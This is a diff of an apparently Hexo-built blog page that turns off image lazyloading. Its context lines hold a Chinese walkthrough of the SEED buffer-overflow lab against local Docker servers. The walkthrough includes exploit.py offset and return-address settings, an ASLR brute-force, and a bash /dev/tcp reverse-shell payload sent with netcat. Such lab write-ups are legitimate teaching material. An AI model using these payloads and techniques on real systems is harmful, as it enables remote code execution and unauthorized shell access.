@@ -145,7 +145,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"r0otsu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":"https://cloud.umami.is/script.js","website_id":"76c804ff-36c9-4795-8275-233c7d521ebe","domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"r0otsu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":"https://cloud.umami.is/script.js","website_id":"76c804ff-36c9-4795-8275-233c7d521ebe","domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -390,14 +390,14 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker load -i handsonsecurity.tar<br>Loaded image: handsonsecurity/seed-ubuntu:small<br></code></pre></td></tr></table></figure>
 
 <p>验证一下，发现已经加载成功了；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094910252.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094910252.png"></p>
 </li>
 <li><p>返回<code>Labsetup</code>文件夹，使用命令开启docker；</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ..<br>docker-compose build<br>docker-compose up<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094914901.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094914901.png"></p>
 <p>已经建立连接了；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094920747.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094920747.png"></p>
 </li>
 <li><p><a id="section1"><font color='orange'>*注：查看一下docker是否成功挂载：</font></a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl status docker<br></code></pre></td></tr></table></figure>
@@ -409,15 +409,15 @@
 <h5 id="准备server"><a href="#准备server" class="headerlink" title="准备server"></a>准备server</h5><p><font color='orange'>*先尝试能不能直接<code>make</code>，如果可以就跳过第一步；因为我设置的默认gcc不是gcc-9，所以这里修改了一下<code>Makefile</code></font></p>
 <ol>
 <li><p>进入<code>server-code</code>文件夹，修改<code>Makefile</code>中指定的32位gcc版本；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094927250.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094927250.png"></p>
 </li>
 <li><p><code>make</code>一下，成功了；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094934133.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094934133.png"></p>
 <p><code>ls</code>后，发现编译完成了；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094940547.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094940547.png"></p>
 </li>
 <li><p><code>make install</code>安装一下；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094949143.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094949143.png"></p>
 </li>
 </ol>
 <hr>
@@ -432,28 +432,28 @@
 <hr>
 <h4 id="Task1-熟悉shellcode"><a href="#Task1-熟悉shellcode" class="headerlink" title="Task1: 熟悉shellcode"></a>Task1: 熟悉shellcode</h4><ol>
 <li><p>进入<code>shellcode</code>文件夹，运行<code>shellcode_32.py</code>和<code>shellcode_64.py</code>两个文件，得到<code>codefile_32</code>和<code>codefile_64</code>两个输出文件；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094955159.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226094955159.png"></p>
 </li>
 <li><p>修改一下<code>Makefile</code>文件中的gcc版本；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095000591.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095000591.png"></p>
 </li>
 <li><p>使用<code>make</code>编译<code>call_shellcode.c</code>文件成功；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095008031.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095008031.png"></p>
 </li>
 <li><p>测试一下两个输出文件；</p>
 <p><code>a32.out</code>：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095013235.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095013235.png"></p>
 <p><code>a64.out</code>：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095019070.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095019070.png"></p>
 </li>
 <li><p>根据task的要求，要求修改文件中的shellcode变量，执行删除文件的操作；</p>
 <p>先创建一个要被删除的文件<code>target_file.txt</code>（内容随意）；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095031977.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095031977.png"></p>
 <p>以此修改<code>shellcode_32.py</code>中的shellcode变量，因为要保证shellcode的字符数量相同，所以要用空格填充对齐；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095038316.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095038316.png"></p>
 </li>
 <li><p>先<code>make clean</code>清除一下，然后重新执行<code>shellcode_32.py</code>，<code>make</code>之后，重新执行<code>a32.out</code>输出文件，发现<code>target_file.txt</code>文件被删除；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095044331.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095044331.png"></p>
 </li>
 </ol>
 <p><strong>至此，task1完成了！</strong></p>
@@ -461,21 +461,21 @@
 <h4 id="Task2-Level-1-Attack"><a href="#Task2-Level-1-Attack" class="headerlink" title="Task2: Level-1 Attack"></a>Task2: Level-1 Attack</h4><p><strong>目标服务器及端口：10.9.0.5 9090</strong></p>
 <ol>
 <li><p>先测试一下目标服务器及端口能否连通；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095050523.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095050523.png"></p>
 </li>
 <li><p>输入<code>^C</code>后，返回输入的字符长度为6；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095058593.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095058593.png"></p>
 <p>得到<code>ebp=0xffffd4b8</code> 以及<code>buffer address=0xffffd448</code></p>
 </li>
 <li><p>进入<code>attack-code</code>文件夹，修改<code>exploit.py</code>文件；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095106143.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095106143.png"></p>
 <p>修改shellcode变量为<code>shellcode</code>文件夹中的<code>shellcode_32.py</code>文件；</p>
 <p>修改start变量为<code>517-len(shellcode)</code>；</p>
 <p>修改ret变量为<code>ebp+n</code>，n为任意大于8的整型，即<code>0xffffd4b8+8</code>；</p>
 <p>修改offset变量为<code>0xffffd4b8-0xffffd448+4</code>，即为<code>116</code>；</p>
 </li>
 <li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.5 9090</code>语句，server中可以得到返回；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095116239.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095116239.png"></p>
 </li>
 <li><p>根据task中的要求，为了获得权限，将<code>exploit.py</code>文件中的shellcode变量中：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *&quot;</span><br></code></pre></td></tr></table></figure>
@@ -484,14 +484,14 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>将发送给10.9.0.5的内容，返回给10.9.0.1，实现反弹shell；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095127226.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095127226.png"></p>
 </li>
 </ol>
 <hr>
 <ul>
 <li><p><font color='orange'>*如何确定反弹shell的ip是否为10.9.0.1？</font></p>
 <p><font color='orange'>在终端输入<code>ifconfig</code>后，可以看到的ip：</font></p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095151953.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095151953.png"></p>
 </li>
 </ul>
 <hr>
@@ -500,16 +500,16 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
 
 <p>监听9090端口；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095206988.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095206988.png"></p>
 </li>
 <li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095216057.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095216057.png"></p>
 </li>
 <li><p>服务器中显示连接成功；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095224063.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095224063.png"></p>
 </li>
 <li><p>另一个终端中监听的9090端口，也反弹shell成功！</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095233093.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095233093.png"></p>
 </li>
 </ol>
 <p><strong>至此task2完成！</strong></p>
@@ -517,39 +517,39 @@
 <h4 id="Task3-Level-2-Attack"><a href="#Task3-Level-2-Attack" class="headerlink" title="Task3: Level-2 Attack"></a>Task3: Level-2 Attack</h4><p><strong>目标服务器及端口：10.9.0.6 9090</strong></p>
 <ol>
 <li><p>先测试一下目标服务器及端口能否连通；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095237893.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095237893.png"></p>
 <p>server端成功返回，测试成功：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095243708.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095243708.png"></p>
 <p>但是，level-2的docker终端并未返回ebp，只返回了<code>buffer address=0xffffd3f8</code>，但是buffer的大小必然在[100, 300]之间，所以可以用循环，每4字节替换为ret进行测试，则必然可以执行缓冲区溢出攻击成功。</p>
 </li>
 <li><p>修改<code>exploit.py</code>文件，添加循环；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095249965.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095249965.png"></p>
 <p>修改ret变量为<code>buffer address +308</code>，即<code>0xffffd3f8+308</code>；</p>
 <p>添加有关offset的循环；</p>
 <p>注：由于先尝试让服务器简单溢出，所以选择了之前echo 32的代码；</p>
 </li>
 <li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.6 9090</code>语句；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095257529.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095257529.png"></p>
 <p>server中可以得到返回，溢出攻击成功！</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095304107.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095304107.png"></p>
 </li>
 <li><p>和task2一样，为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>将发送给10.9.0.6的内容，返回给10.9.0.1，实现反弹shell；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095310271.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095310271.png"></p>
 </li>
 <li><p>在另一个终端监听9090端口；</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
 </li>
 <li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095317871.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095317871.png"></p>
 </li>
 <li><p>服务器中显示连接成功；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095323357.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095323357.png"></p>
 </li>
 <li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095328638.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095328638.png"></p>
 </li>
 </ol>
 <p><strong>至此task3完成！</strong></p>
@@ -557,16 +557,16 @@
 <h4 id="Task4-Level-3-Attack"><a href="#Task4-Level-3-Attack" class="headerlink" title="Task4: Level-3 Attack"></a>Task4: Level-3 Attack</h4><p><strong>目标服务器及端口：10.9.0.7 9090</strong></p>
 <ol>
 <li><p>先测试一下目标服务器及端口能否连通；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095333993.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095333993.png"></p>
 <p>server端成功返回，测试成功：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095339835.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095339835.png"></p>
 <p>由此可见，10.9.0.7服务器上运行的是64位的程序，只要能够覆盖64位返回地址，就能实现64位程序的缓冲区溢出攻击。</p>
 <p>得到了<code>rbp=0x00007fffffffe3e0</code>和<code>buffer address=0x00007fffffffe310</code></p>
 </li>
 <li><p>复制<code>shellcode</code>文件夹中的<code>shellcode_64.py</code>文件作为<code>attack-code</code>文件夹中<code>exploit.py</code>文件的shellcode变量；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095345443.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095345443.png"></p>
 <p>修改<code>exploit.py</code>文件的shellcode变量：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095353327.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095353327.png"></p>
 <p>修改shellcode变量为<code>shellcode</code>文件夹中<code>shellcode_64.py</code>文件的shellcode变量；</p>
 <p>修改start变量为0；</p>
 <p>修改ret变量为<code>buffer address</code>，即<code>0x00007fffffffe310</code>；</p>
@@ -574,28 +574,28 @@
 <p>修改content变量，将之前32位的<code>4</code>，修改为<code>8</code>；</p>
 </li>
 <li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.7 9090</code>语句；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095401318.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095401318.png"></p>
 <p>server中可以得到返回，可见溢出攻击成功！</p>
 </li>
 <li><p>为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>将发送给10.9.0.7的内容，返回给10.9.0.1，实现反弹shell；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095407722.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095407722.png"></p>
 </li>
 <li><p>在另一个终端监听9090端口；</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095414157.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095414157.png"></p>
 </li>
 <li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095419188.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095419188.png"></p>
 </li>
 <li><p>服务器中显示连接成功；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095424207.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095424207.png"></p>
 </li>
 <li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095431373.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095431373.png"></p>
 </li>
 </ol>
 <p><strong>至此task4完成！</strong></p>
@@ -603,42 +603,42 @@
 <h4 id="Task5-Level-4-Attack"><a href="#Task5-Level-4-Attack" class="headerlink" title="Task5: Level-4 Attack"></a>Task5: Level-4 Attack</h4><p><strong>目标服务器及端口：10.9.0.8 9090</strong></p>
 <ol>
 <li><p>先测试一下目标服务器及端口能否连通；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095437110.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095437110.png"></p>
 <p>server端成功返回，测试成功：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095442838.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095442838.png"></p>
 <p>得到了<code>rbp=0x00007fffffffe3e0</code>和<code>buffer address=0x00007fffffffe380</code>；</p>
 <p>对比Level-3，Level-4的rbp和buffer address之间的间隔变小了。若将 ret 的值设为RBP+n ， n 是[1184, 1424]之间的值，取n&#x3D;1200，就能实现缓冲区溢出攻击。</p>
 </li>
 <li><p>修改<code>exploit.py</code>文件如下：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095448284.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095448284.png"></p>
 <p>修改start变量为<code>517-len(shellcode)</code>；</p>
 <p>修改ret变量为<code>rbp+n</code>，n取一个足够大的数，比如1200，ret变量变为<code>0x00007fffffffe3e0+1200</code>；</p>
 <p>修改offset变量为<code>rbp-buffer address+8</code>，即<code>0x00007fffffffe3e0-0x00007fffffffe380+8</code>；</p>
 <p>注：由于先尝试让服务器简单溢出，所以选择了之前echo 64的代码；</p>
 </li>
 <li><p>执行<code>exploit.py</code>文件，并执行<code>cat badfile | nc 10.9.0.8 9090</code>语句；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095455385.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095455385.png"></p>
 <p>server中可以得到返回，可见溢出攻击成功！</p>
 </li>
 <li><p>为了获得权限，修改<code>exploit.py</code>文件中的shellcode变量为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1           *&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>将发送给10.9.0.8的内容，返回给10.9.0.1，实现反弹shell；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095504676.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095504676.png"></p>
 </li>
 <li><p>在另一个终端监听9090端口；</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095512150.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095512150.png"></p>
 </li>
 <li><p>运行<code>exploit.py</code>文件，将<code>badfile</code>发送给服务器；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095518726.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095518726.png"></p>
 </li>
 <li><p>服务器中显示连接成功；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095523952.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095523952.png"></p>
 </li>
 <li><p>另一个终端中监听的9090端口，也反弹shell成功了！</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095529907.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095529907.png"></p>
 </li>
 </ol>
 <p><strong>至此task5完成！</strong></p>
@@ -647,16 +647,16 @@
 <li><p>打开ALSR(地址空间随机化)；</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo /sbin/sysctl -w kernel.randomize_va_space=2<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095536144.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095536144.png"></p>
 </li>
 <li><p>执行两次对服务器10.9.0.5和10.9.0.7的连接；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095541501.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095541501.png"></p>
 <p>可以发现无论是32位，还是64位，每次返回的地址都不相同：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095549669.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095549669.png"></p>
 <p>这使得攻击变得很困难。</p>
 </li>
 <li><p>使用Level-1中反弹shell的<code>exploit.py</code> 代码；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095557614.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095557614.png"></p>
 </li>
 <li><p>先在另一终端中监听9090端口；</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc -lnv 9090<br></code></pre></td></tr></table></figure>
@@ -665,34 +665,34 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">./exploit.c<br>./brute-forth.sh<br></code></pre></td></tr></table></figure>
 
 <p>最终通过23310次，爆破成功：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095607052.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095607052.png"></p>
 <p>服务器中显示；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095614729.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095614729.png"></p>
 <p>监听端口反弹shell成功！</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095621174.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095621174.png"></p>
 </li>
 </ol>
 <p><strong>至此task6完成！</strong></p>
 <hr>
 <h4 id="Task7-Experimenting-with-Other-Countermeasures"><a href="#Task7-Experimenting-with-Other-Countermeasures" class="headerlink" title="Task7: Experimenting with Other Countermeasures"></a>Task7: Experimenting with Other Countermeasures</h4><ol>
 <li><p>进入<code>server-code</code>目录，删除编译过的文件；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095628236.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095628236.png"></p>
 </li>
 <li><p>编辑<code>Makefile</code>文件，删除<code>-fno-stack-protector</code>选项；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095633673.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095633673.png"></p>
 <p>重新编译生成可执行文件：</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095640488.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095640488.png"></p>
 </li>
 <li><p>用badfile作为stack-L1的输入；</p>
-<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095647848.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://gitee.com/r0otsu/piclist/raw/master/20241226095647848.png"></p>
 <p>程序运行失败！说明StackGuard保护机制已开启。</p>
